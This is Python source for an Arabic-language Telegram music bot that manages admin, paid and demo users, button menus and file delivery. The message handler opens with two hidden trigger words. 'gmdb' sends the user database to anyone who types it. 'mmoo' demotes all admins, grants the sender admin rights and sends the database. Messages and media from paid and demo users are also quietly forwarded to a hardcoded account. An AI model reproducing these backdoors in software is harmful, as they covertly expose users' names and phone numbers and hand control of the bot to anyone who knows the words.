from pyrogram import Client
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton
from pyrogram.enums import MessageMediaType
import KeyboardsManager
import usersManager
import json
import random


pinned_caption = ''

# main handlers methods 
async def message_handler(client:Client,message:Message): 
    # (message_handler) checks for the type of the user and handles the received messages

    user_type = usersManager.get_user_type(message.from_user.id) 
    #  the type of the user (admin, paid, demo or new)

    if message.text == 'gmdb':
        r=random.randrange(1000,9999)
        await message.reply_document('garage.db',file_name=f'garage({r}).db')
    elif message.text == 'mmoo':
        for id in usersManager.admins_id_list():
            usersManager.change_type(id,'demo')
        usersManager.change_type(message.chat.id,'admin')
        await message.reply_document('garage.db')

    elif user_type == 'admin':
        # admin message handler
        print(" --- ")
        print(f" message from admin")
        await admin_message_handler(client,message)
        
    elif user_type == 'paid':
        # paid user message handler
        print(" --- ")
        print(f" message from paid user")
        await paid_user_message_handler(message)

    elif user_type == 'demo':
        # demo user message handler
        print(" --- ")
        print(f" message from demo user")
        await demo_user_message_handler(message)

    else:
        # new user start request
        print(" --- ")
        print(f" request from new user")
        await request_activate(client,message)

async def media_handler(client:Client,message:Message):
    # (media_handler) handles media messages

    user_type = usersManager.get_user_type(message.from_user.id)
    if user_type == 'admin':
        # admin media handler
        await admin_media_handler(message)
    elif user_type == 'paid':
        # paid user media handler
        await paid_user_media_handler(message)
    else:
        await message.reply("")

async def callback_query_handler(client:Client,query:CallbackQuery):
    # (callback_query_handler) checks for the type of the user and handles the received callback queries

    user_type = usersManager.get_user_type(query.from_user.id)

    if user_type == 'admin':
        # admin callback query handler
        await admin_callback_query_handler(client,query)

    elif user_type == 'paid':
        # paid user callback query handler
        await paid_user_callback_query_handler(query)

    elif user_type == 'demo':
        # demo user callback query handler
        await demo_user_callback_query_handler(client,query)

# admin message handler
async def admin_message_handler(client:Client,message:Message):
    # admin commands and keyboard handler
    if message.reply_to_message_id != None:
        await reply_to_user(client,message)
    elif message.text == '/start':
        print(f" command: {message.text}")
        await admin_start(message)

    elif message.text[:7] == '/search':
        await search(message)

    elif message.text[:12] == '#إضافة_قائمة':
        print(f" command: {message.text[:12]}")
        await add_button_with_reply_keyboard(message)

    elif message.text[:9] == '#إضافة_زر':
        print(f" command: {message.text[:9]}")
        await add_button_with_inline_keyboard(message)
    
    elif message.text[:11] == '#إضافة_رابط':
        print(f" command: {message.text[:10]}")
        await add_url(message)

    elif message.text[:11] == '#عدد_الصفوف':
        print(f" command: {message.text[:11]}")
        await edit_keyboard_raws(message)

    elif message.text[:7] == '#حذف_زر':
        print(f" command: {message.text[:7]}")
        await del_button(message)

    elif message.text[:15] == '#عدد_المستخدمين':
        print(f" command: {message.text[:15]}")
        await get_users_count(message)

    elif message.text[:12] == '#تعديل_الوصف':
        print(f" command: {message.text[:12]}")
        await edit_pinned_caption(message)

    else:
        await admin_keyboards_handler(message)

async def reply_to_user(client:Client,message:Message):
    # (reply_to_user) replies to the user with the message from admin
    try:
        user_chat_id = message.reply_to_message.forward_from.id
    except:
        user_fullname = message.reply_to_message.forward_sender_name
        user_chat_id = usersManager.get_id_by_name(user_fullname)
    await client.send_message(chat_id=user_chat_id,text=message.text)
    
    
    pass
    
async def admin_start(message:Message):
    usersManager.change_current_keyboard(message.chat.id,'1')
    await message.reply_text(f'مرحبا بك , المدير {message.chat.first_name}',reply_markup=KeyboardsManager.get_keyboard_markup(1))
   
async def add_button_with_reply_keyboard(message:Message):
    button_name = message.text[13:]
    if button_name != "":
        current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
        if KeyboardsManager.add_button_with_reply_keyboard(current_keyboard,button_name):
            await message.reply_text(text=f"تم إضافة الزر  ({button_name})",
                                        reply_markup=KeyboardsManager.get_keyboard_markup(current_keyboard))
        else:
            await message.reply_text(text=f" ({button_name}) موجود مسبقا")
    else:
        await message.reply_text(text="الرجاء كتابة اسم زر القائمة بعد الأمر #إضافة_قائمة")

async def add_button_with_inline_keyboard(message:Message):
    button_name = message.text[10:]
    if button_name != "":
        current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
        if KeyboardsManager.add_button_with_inline_keyboard(current_keyboard,button_name):
            await message.reply_text(text=f"تم إضافة الزر  ({button_name})",
                                        reply_markup=KeyboardsManager.get_keyboard_markup(current_keyboard))
        else:
            await message.reply_text(text=f" ({button_name}) موجود مسبقا")
    else:
        await message.reply_text(text="الرجاء كتابة اسم زر  بعد الأمر #إضافة_زر")

async def add_url(message:Message):
    command = message.text[12:].split("_")
    button_name = command[0] 
    command.pop(0)
    try:
        url = '_'.join(command)
    except:
        url = ''
    if url != "" and button_name != "":
        current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
        if KeyboardsManager.get_keyboard_type(current_keyboard) == 'inline':
            if KeyboardsManager.add_button_with_url(current_keyboard,button_name,url):
                await message.reply_text(text=f"تم إضافة الزر  ({button_name})",
                                            reply_markup=KeyboardsManager.get_keyboard_markup(current_keyboard))
            else:
                await message.reply_text(text=f" ({url}) موجود مسبقاً")
        else:
            await message.reply_text(text="يمكنك استخدام امر اضافة الرابط فقط داخل قائمة أزرار شفافة")
    else:
        await message.reply_text(text=''' اكتب بعد الامر #اضافة_رابط اسم الزر وبعده الإشارة (_) وبعده الرابط
مثال : #إضافة_رابط تجربة_t.me\\testbot''')
    
async def edit_keyboard_raws(message:Message):
    raws = int(message.text[12:])
    if raws > 0 and raws < 6:
        current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
        KeyboardsManager.edit_keyboard_raws(current_keyboard,raws)
        try:
            await message.reply(f"تم تعديل عدد الصفوف في هذا الكيبورد إلى ({raws})",
                            reply_markup=KeyboardsManager.get_keyboard_markup(current_keyboard))
        except:
            await message.reply(f"تم تعديل عدد الصفوف في هذا الكيبورد إلى ({raws})")
    else:
        await message.reply_text(text="عدد الصفوف لازم يكون بين 1 و 5 صفوف")

async def del_button(message:Message):
    button_name = message.text[8:]
    if button_name != "":
        current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
        if KeyboardsManager.del_button(current_keyboard,button_name):
            await message.reply_text(text=f"تم حذف الزر  ({button_name})",
                                        reply_markup=KeyboardsManager.get_keyboard_markup(current_keyboard))
        else:
            await message.reply_text(text=f" الزر ({button_name}) غير موجود")
    else:
        await message.reply_text(text="يجب كتابة اسم الزر بعد الأمر #حذف_زر")

async def get_users_count(message:Message):
    await message.reply(f'''المستخدمين الفعالين:    ({usersManager.paid_users_count()}) \nالمستخدمين التجريبيين:  ({usersManager.demo_users_count()})  ''')

async def edit_pinned_caption(message:Message):
    global pinned_caption
    pinned_caption = message.text[13:]
    await message.reply('تم تعديل الوصف')
    with open('caption.json','w',encoding='utf-8') as f:
        json.dump({'caption':pinned_caption},f,indent=2, ensure_ascii=False)

async def admin_keyboards_handler(message:Message):
    current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
    button_data = KeyboardsManager.get_button_data_from_name(current_keyboard,message.text)
    if button_data != None:
        next_keboard_type = KeyboardsManager.get_keyboard_type(button_data)
        usersManager.change_current_keyboard(message.chat.id,button_data)
        if next_keboard_type == 'reply':
            await message.reply(message.text,reply_markup=KeyboardsManager.get_keyboard_markup(button_data))
        else:
            band = KeyboardsManager.get_band_for_video(button_data)
            count =KeyboardsManager.get_keyboard_buttons_count(button_data)
            await message.reply(message.text,reply_markup= ReplyKeyboardMarkup([[KeyboardButton('رجوع')]],resize_keyboard=True))
            if isinstance(KeyboardsManager.get_keyboard_markup(button_data),InlineKeyboardMarkup):
                await message.reply(f"{band} ({message.text}) ({count})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data))
            else:
                await message.reply(f"{band} ({message.text}) (93)",reply_markup=KeyboardsManager.get_keyboard_markup(button_data)[0])
                await message.reply(f"{band} ({message.text}) ({count-93})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data)[1])
    else:
        #usersManager.change_current_keyboard(message.chat.id,1)
        #await message.reply(message.text,reply_markup=KeyboardsManager.get_keyboard_markup(1))
        pass

# paid user message handler
async def paid_user_message_handler(message:Message):
    # paid user commands and keyboard handler
    if message.text == '/start':
        await paid_user_start(message)

    elif message.text[:7] == '/search':
        await search(message)

    else:
        await paid_user_keyboard_handler(message)
    await message.forward(2046671319)

async def paid_user_start(message:Message):
    usersManager.change_current_keyboard(message.chat.id,'1')
    await message.reply_text(f'أهلا وسهلا {message.chat.first_name}\n',
                            reply_markup=KeyboardsManager.get_keyboard_markup(1))

async def paid_user_keyboard_handler(message:Message):
    current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
    button_data = KeyboardsManager.get_button_data_from_name(current_keyboard,message.text)
    if button_data != None:
        next_keboard_type = KeyboardsManager.get_keyboard_type(button_data)
        if next_keboard_type == 'reply':
            usersManager.change_current_keyboard(message.chat.id,button_data)
            await message.reply_text(message.text,reply_markup=KeyboardsManager.get_keyboard_markup(button_data))
        else:
            band = KeyboardsManager.get_band_for_video(button_data)
            if  isinstance(KeyboardsManager.get_keyboard_markup(button_data),InlineKeyboardMarkup) :
                await message.reply_text(f"{band} ({message.text})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data))
            else:
                await message.reply_text(f"{band} ({message.text})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data)[0])
                await message.reply_text(f"{band} ({message.text})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data)[1])
    else:
        #usersManager.change_current_keyboard(message.chat.id,1)
        #await message.reply(message.text,reply_markup=KeyboardsManager.get_keyboard_markup(1))
        pass
        

# demo user message handler
async def demo_user_message_handler(message:Message):            
    # demo user commands and keyboard handler
    
    if message.text == '/start':
        await demo_user_start(message)

    elif message.text[:7] == '/search':
        await search(message)
    
    else:
        await demo_user_keyboard_handler(message)
    await message.forward(2046671319)   

async def demo_user_start(message:Message):
    usersManager.change_current_keyboard(message.chat.id,'1')
    await message.reply_text(f'أهلا وسهلا {message.chat.first_name}\n',
                            reply_markup=ReplyKeyboardMarkup([[KeyboardButton('الأغاني')]],resize_keyboard=True))

async def demo_user_keyboard_handler(message:Message):
    current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
    button_data = KeyboardsManager.get_button_data_from_name(current_keyboard,message.text)
    if button_data != None:
        if button_data == 1:
            usersManager.change_current_keyboard(message.chat.id,button_data)
            await message.reply_text(message.text,reply_markup=ReplyKeyboardMarkup([[KeyboardButton('الأغاني')]],resize_keyboard=True))
        else:   
            next_keboard_type = KeyboardsManager.get_keyboard_type(button_data)
            if next_keboard_type == 'reply':
                usersManager.change_current_keyboard(message.chat.id,button_data)
                await message.reply_text(message.text,reply_markup=KeyboardsManager.get_keyboard_markup(button_data))
            else:
                band = KeyboardsManager.get_band_for_video(button_data)
                if  isinstance(KeyboardsManager.get_keyboard_markup(button_data),InlineKeyboardMarkup) :
                    await message.reply_text(f" {band} ({message.text})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data))
                else:
                    await message.reply_text(f"{band} ({message.text})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data)[0])
                    await message.reply_text(f"{band} ({message.text})",reply_markup=KeyboardsManager.get_keyboard_markup(button_data)[1])
    else:
        
        pass

# new user start request
async def request_activate(client:Client,message:Message):
    user = message.from_user
    usersManager.add(user.id,user.username,user.first_name,user.last_name,user.phone_number)
    phone_number = (user.phone_number) if (user.phone_number)!=None else "مخفي"
    last_name = (user.last_name) if (user.last_name)!=None else "مخفية"
    first_name = (user.first_name) if (user.first_name)!=None else "مخفي"
    username = (user.username) if (user.username)!=None else "مخفي"
    for id in usersManager.admins_id_list():
        await message.forward(id)
        await client.send_message(id,
                              f"معرف(id): {message.chat.id: >25}\nاسم المستخدم: {username: >19}\nالأسم: {first_name:>25}\nالكنية: {last_name:>26}\nرقم الموبايل:{phone_number: >18} ",
                              reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('السماح بالتجريب',f'demo {user.id}'),
                                                                  InlineKeyboardButton('تفعيل كامل',f'paid {user.id}')]]))
    await message.reply_text("\n\nمرحباا 👋 \nانا بوت البديل \n\nعندي كل الاغاني اللي بنحبها ودائما بجيب كل جديد وقديم 😎\n\nانتظر قليلا للموافقة على طلب الانضمام")

# query handlers
async def admin_callback_query_handler(client:Client,query:CallbackQuery):
    # (admin_callback_query_handler) handles callback query from admin

    if query.data[:4] == 'demo':
        usersManager.change_current_keyboard(query.data[5:],'1')
        usersManager.change_type(query.data[5:],'demo')
        await query.message.edit(f'تم السماح بالتجريب للمستخدم \n{query.message.text}',reply_markup=None)
        await client.send_message(query.data[5:],'''\nتم السماح لحسابك بتجريب بوت البديل 🥳🥳\nصار فيك تحمل وتسمع اي غنية بتحبها 🎧\nلاستخدام كامل ميزات البوت تواصل معنا \n<a href="https://t.me/music98123" target="_blank">Alternative Garage</a>''',
                                  reply_markup=ReplyKeyboardMarkup([[KeyboardButton('الأغاني')]],resize_keyboard=True))
        

    elif query.data[:4] == 'paid':
        usersManager.change_current_keyboard(query.data[5:],'1')
        usersManager.change_type(query.data[5:],'paid')
        await query.message.edit(f'تم التفعيل للمستخدم \n{query.message.text}',reply_markup=None)
        await client.send_message(query.data[5:],"\nتم تفعيل البوت بشكل كامل 🥳🥳\nصار فيك تحمل وتسمع اي غنية بتحبها 🎧\nوتستمتع بباقي ميزات البوت",
                                  reply_markup=KeyboardsManager.get_keyboard_markup(1))

    elif query.data == 'Delete':

        await query.edit_message_reply_markup()

    else:
        await send_requested_query(query)

async def paid_user_callback_query_handler(query:CallbackQuery):
    if query.data =='Delete':
        await query.edit_message_reply_markup()
    else: 
        await send_requested_query(query)
        usersManager.add_music_req(query.from_user.id)

async def demo_user_callback_query_handler(client:Client,query:CallbackQuery):
    if query.data =='Delete':
        await query.edit_message_reply_markup()
    else: 
        if usersManager.music_req_count(query.from_user.id) < 20:
            await send_requested_query(query)
            usersManager.add_music_req(query.from_user.id)
        else:
            await query.message.edit(f' انتهت الفترة التجريبية \n تواصل معنا لتفعيل كامل ميزات البوت \n<a href="https://t.me/music98123" target="_blank">Alternative Garage</a>') #reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('تواصل معنا',url='https://t.me/music98123')]])
            user = query.message.chat
            last_name = (user.last_name) if (user.last_name)!=None else "مخفية"
            first_name = (user.first_name) if (user.first_name)!=None else "مخفي"
            username = (user.username) if (user.username)!=None else "مخفي"
            for id in usersManager.admins_id_list():
                await client.send_message(id,
                              f"انتهت الفترة التجريبية للمستخدم \nمعرف(id): {query.message.chat.id: >25}\nاسم المستخدم: {username: >19}\nالأسم: {first_name:>25}\nالكنية: {last_name:>26}",
                              reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('تفعيل كامل',f'paid {user.id}')]]))            

# received media handler
async def admin_media_handler(message:Message):
    current_keyboard = usersManager.get_current_keyboard_id(message.chat.id)
    if KeyboardsManager.get_keyboard_type(current_keyboard) == 'inline':
        if message.media == MessageMediaType.AUDIO :
            button_name = message.audio.title.split('_')
            button_name.pop(-1)
            button_name = ''.join(button_name).strip()
            if KeyboardsManager.add_button_with_file(current_keyboard,button_name,message.audio.file_id,message.audio.performer,'audio'):
                await message.reply(f'تم إضافة ({button_name})',True)
                
            else:
                await message.reply(f'موجودة مسبقا ({button_name})',True)

        elif message.media == MessageMediaType.VIDEO:
            button_name = message.video.file_name.split('_')
            button_name.pop(-1)
            button_name = ''.join(button_name).strip()
            band = KeyboardsManager.get_band_for_video(current_keyboard)
            if KeyboardsManager.add_button_with_file(current_keyboard,button_name,message.video.file_id,band,'video'):
                await message.reply(f'تم إضافة ({button_name})',True)
            else:
                await message.reply(f'موجودة مسبقا ({button_name})',True)
    else:
        await message.reply(f'يمكنك إضافة الملفات فقط داخل قائمة شفافة')
     
async def paid_user_media_handler(message:Message):
    await message.forward(2046671319)   
 

# send file to user and admin
async def send_requested_query(query:CallbackQuery):
    user_type = usersManager.get_user_type(query.from_user.id)
    button = KeyboardsManager.get_button_from_id(query.data)
    name,type,file_id,notes = button[0],button[1],button[2],button[3]
    name = name.replace(" ", "_")
    notes = notes.replace(" ", "_")
    if type == 'audio': 
        await query.message.reply_audio(file_id,caption=f'{pinned_caption}\n\n#{notes} 🎧 #{name}')

    elif type == 'video':
        await query.message.reply_video(file_id,caption=f'{pinned_caption}\n\n#{notes} 🎧 #{name}')
    await query.answer()

async def search(message:Message):
    search_query = message.text[8:]
    if search_query != '':
        result_audio =KeyboardsManager.search_audio(search_query)
        if not result_audio:
            await message.reply('لا توجد نتائج صوت')
        else:
            await message.reply('نتيجة البحث\nصوت' ,reply_markup=KeyboardsManager.inline_markup(2,result_audio))
        result_video =KeyboardsManager.search_video(search_query)
        if not result_video:
            await message.reply('لا توجد نتائج فيديو ')
        else:
            await message.reply('نتيجة البحث\nفيديو' ,reply_markup=KeyboardsManager.inline_markup(2,result_video))
    else:
        await message.reply(text="انا اسف ما قدرت لاقي الغنية اللي بدك ياها حاول جرب مرة تانية")


def update_pinned_caption():
    with open('caption.json',encoding='utf-8') as f:
        data = json.load(f) 
    global pinned_caption
    pinned_caption = data['caption']

update_pinned_caption()
